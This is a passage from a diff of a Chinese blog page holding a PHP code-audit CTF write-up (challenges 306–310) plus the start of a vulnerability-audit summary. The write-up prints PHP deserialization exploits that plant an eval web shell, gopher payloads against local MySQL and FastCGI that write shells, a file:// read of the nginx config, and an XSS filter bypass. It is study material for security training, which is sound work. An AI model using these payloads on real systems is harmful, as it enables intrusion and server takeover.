 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn=<span class="keyword">new</span> <span class="title function_ invoke__">log</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
 
 <p>执行exp结果:</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319</span><br></pre></td></tr></table></figure>
 
 <p>访问<code>index.php</code>并添加<code>user</code>cookie</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221532442.png" alt="image-20230322153252375"></p>
-<p>写入木马文件<code>1.php</code><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221533539.png" alt="image-20230322153356475"></p>
-<h4 id="307"><a href="#307" class="headerlink" title="307"></a>307</h4><p>用工具扫一下, 扫出<code>shell_exec</code>可能存在任意命令执行漏洞<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221923809.png" alt="image-20230322192359768"></p>
-<p>这里先找一下<code>clearCache</code>, 可以全局搜索一下, 在logout.php中, 发现了可利用点<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221925594.png" alt="image-20230322192543459"></p>
-<p>再看一下<code>cache_dir</code>, 在<code>config</code>类里<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221927890.png" alt="image-20230322192721758"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221532442.png"
+                      alt="image-20230322153252375"
+                ></p>
+<p>写入木马文件<code>1.php</code><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221533539.png"
+                      alt="image-20230322153356475"
+                ></p>
+<h4 id="307"><a href="#307" class="headerlink" title="307"></a>307</h4><p>用工具扫一下, 扫出<code>shell_exec</code>可能存在任意命令执行漏洞<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221923809.png"
+                      alt="image-20230322192359768"
+                ></p>
+<p>这里先找一下<code>clearCache</code>, 可以全局搜索一下, 在logout.php中, 发现了可利用点<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221925594.png"
+                      alt="image-20230322192543459"
+                ></p>
+<p>再看一下<code>cache_dir</code>, 在<code>config</code>类里<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303221927890.png"
+                      alt="image-20230322192721758"
+                ></p>
 <p>这次我们从<code>logout.php</code>写<code>service</code>cookie, 写入一句话木马php文件</p>
 <p>访问<code>http://url/controller/1.php</code></p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303222036762.png" alt="image-20230322203615656"></p>
-<h4 id="308"><a href="#308" class="headerlink" title="308"></a>308</h4><p>上题利用的漏洞已经被修复了, 但是<code>fun.php</code>里多了一个ssrf利用点<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303222120723.png" alt="image-20230322212005877"></p>
-<p>在<code>dao.php</code>中发现被调用<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303222236394.png" alt="image-20230322223652256"></p>
-<p>又在<code>index.php</code>中找到利用点<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303222241950.png" alt="image-20230322224124783"></p>
-<p>然后我们发现数据库密码为空, 这里我们可以想到使用gopher打MySQL<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231311585.png" alt="image-20230323131134417"></p>
-<p>利用gopherus生成，地址<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus![image-20230323131716266](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231317501.png)">https://github.com/tarunkant/Gopherus![image-20230323131716266](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231317501.png)</a></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303222036762.png"
+                      alt="image-20230322203615656"
+                ></p>
+<h4 id="308"><a href="#308" class="headerlink" title="308"></a>308</h4><p>上题利用的漏洞已经被修复了, 但是<code>fun.php</code>里多了一个ssrf利用点<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303222120723.png"
+                      alt="image-20230322212005877"
+                ></p>
+<p>在<code>dao.php</code>中发现被调用<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303222236394.png"
+                      alt="image-20230322223652256"
+                ></p>
+<p>又在<code>index.php</code>中找到利用点<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303222241950.png"
+                      alt="image-20230322224124783"
+                ></p>
+<p>然后我们发现数据库密码为空, 这里我们可以想到使用gopher打MySQL<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231311585.png"
+                      alt="image-20230323131134417"
+                ></p>
+<p>利用gopherus生成，地址<a class="link"   target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus![image-20230323131716266](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231317501.png)" >https://github.com/tarunkant/Gopherus![image-20230323131716266](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231317501.png)<i class="fas fa-external-link-alt"></i></a></p>
 <p>可以构造出最终exp</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span>=<span class="string">&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>访问首页并写入payload</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231347831.png" alt="image-20230323134729781"></p>
-<h4 id="309"><a href="#309" class="headerlink" title="309"></a>309</h4><p>这题提到说MySQL有密码了, 那我们就没法利用3306端口了, 可以先通过file协议读一下配置文件, 看看有没有其他利用点, 可以看到是nginx<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231418608.png" alt="image-20230323141848567"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231347831.png"
+                      alt="image-20230323134729781"
+                ></p>
+<h4 id="309"><a href="#309" class="headerlink" title="309"></a>309</h4><p>这题提到说MySQL有密码了, 那我们就没法利用3306端口了, 可以先通过file协议读一下配置文件, 看看有没有其他利用点, 可以看到是nginx<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231418608.png"
+                      alt="image-20230323141848567"
+                ></p>
 <p>poc</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span>=<span class="string">&#x27;file:///etc/nginx/nginx.conf&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231427894.png" alt="image-20230323142709837"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231427894.png"
+                      alt="image-20230323142709837"
+                ></p>
 <p>发现这里开放了9000端口, 我们可以尝试打一下<code>fastcgi</code></p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231451022.png" alt="image-20230323145142784"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231451022.png"
+                      alt="image-20230323145142784"
+                ></p>
 <p>exp</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27%20echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%201.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="310"><a href="#310" class="headerlink" title="310"></a>310</h4><p>像上题一样, 先读一下配置文件看看有没有什么蹊跷, 这里9000端口仍然开放, 我们再尝试打一下试试</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231904011.png" alt="image-20230323190405939"></p>
-<p>可以成功读取<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231909584.png" alt="image-20230323190931517"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231904011.png"
+                      alt="image-20230323190405939"
+                ></p>
+<p>可以成功读取<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231909584.png"
+                      alt="image-20230323190931517"
+                ></p>
 <p>这题我们还会发现配置文件里还有另一个端口, 4476, 可以直接利用这个端口</p>
-<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231500905.png" alt="image-20230323150022849"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231500905.png"
+                      alt="image-20230323150022849"
+                ></p>
 <p>直访问</p>
 <p>exp</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;http://127.0.0.1:4476&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>拿到flag<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231502308.png" alt="image-20230323150223253"></p>
+<p>拿到flag<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231502308.png"
+                      alt="image-20230323150223253"
+                ></p>
 <h3 id="常见漏洞审计方法总结"><a href="#常见漏洞审计方法总结" class="headerlink" title="常见漏洞审计方法总结"></a>常见漏洞审计方法总结</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>首先了解SQL注入常见的业务场景与漏洞类型</p>
 <ul>
 <li>用户登录</li>
@@ -360,120 +749,326 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span>=<span class="variable">$_SERVER</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d+\.\d+\.\d+\.\d+/&#x27;</span>,<span class="variable">$ip</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$ip</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>我们只需要在传入的payload以IP地址开头即可绕过, 像这样<code>127.0.0.1&lt;/scritp&gt;alert(xss)&lt;/scritp&gt;</code></p>
-<p>文章参考:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45590334/article/details/126517767">https://blog.csdn.net/qq_45590334/article/details/126517767</a></p>
+<p>文章参考:<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45590334/article/details/126517767" >https://blog.csdn.net/qq_45590334/article/details/126517767<i class="fas fa-external-link-alt"></i></a></p>
 
-            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
-            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
-                <source type="audio/mpeg" src="">
-            </audio>
+            </div>
+
             
-                <ul id="audio-list" style="display:none">
+
+            
+                <ul class="post-tags-box">
                     
-                        
-                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
-                        
+                        <li class="tag-item">
+                            <a href="/tags/Web/">#Web</a>&nbsp;
+                        </li>
                     
-                        
-                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
-                        
+                        <li class="tag-item">
+                            <a href="/tags/Study/">#Study</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/PHP/">#PHP</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#代码审计</a>&nbsp;
+                        </li>
                     
                 </ul>
             
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/03/08/Python_Selenium%E5%AD%A6%E4%B9%A0/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Python_Selenium_Study</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;Comments
+    </div>
+    
+        
+            
+
+    <div class="waline-comment-container">
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"/>
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline-meta.css"/>
+        <script data-pjax src="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.js"></script>
+        <div id="waline-comment"></div>
+        <script data-pjax>
+          function loadWaline() {
+            Waline.init({
+              el: '#waline-comment',
+              serverURL: 'https://lsvf4zhg.api.lncldglobal.com',
+              lang: 'en' || 'zh-CN',
+              comment: '.post-comments-count',
+              reaction: 'true' === 'true'
+            })
+          }
+
+          if ('true' === 'true') {
+            setTimeout(() => {
+              loadWaline()
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadWaline)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%86%E8%A7%A3%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84"><span class="nav-text">了解系统架构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E4%BA%86%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6"><span class="nav-text">使用了开发框架</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#think-PHP"><span class="nav-text">think PHP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#laravel"><span class="nav-text">laravel</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6"><span class="nav-text">没有使用开发框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E8%BF%87%E6%BB%A4%E5%88%86%E6%9E%90"><span class="nav-text">参数过滤分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mvc%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E8%BF%87%E6%BB%A4%E6%83%85%E5%86%B5%E5%88%86%E6%9E%90"><span class="nav-text">mvc模式下的过滤情况分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%94%9Fphp%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E8%BF%87%E6%BB%A4%E5%88%86%E6%9E%90"><span class="nav-text">原生php模式下的过滤分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E5%87%A0%E4%B8%AA%E9%A2%98"><span class="nav-text">做几个题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#301"><span class="nav-text">301</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#302"><span class="nav-text">302</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-text">写入一句话木马</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#303"><span class="nav-text">303</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#304"><span class="nav-text">304</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#305"><span class="nav-text">305</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#306"><span class="nav-text">306</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#307"><span class="nav-text">307</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#308"><span class="nav-text">308</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#309"><span class="nav-text">309</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#310"><span class="nav-text">310</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="nav-text">常见漏洞审计方法总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF"><span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF"><span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E5%88%A0%E9%99%A4%E3%80%81%E4%B8%8B%E8%BD%BD"><span class="nav-text">文件上传、删除、下载</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="nav-text">文件删除</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-text">文件写入</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XXE"><span class="nav-text">XXE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">反序列化</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93"><span class="nav-text">审计技巧总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GPC"><span class="nav-text">GPC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98"><span class="nav-text">利用字符处理问题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99"><span class="nav-text">利用字符处理函数报错</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%88%AA%E6%96%AD"><span class="nav-text">利用字符串截断</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8D%E4%B8%A5%E8%B0%A8%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span 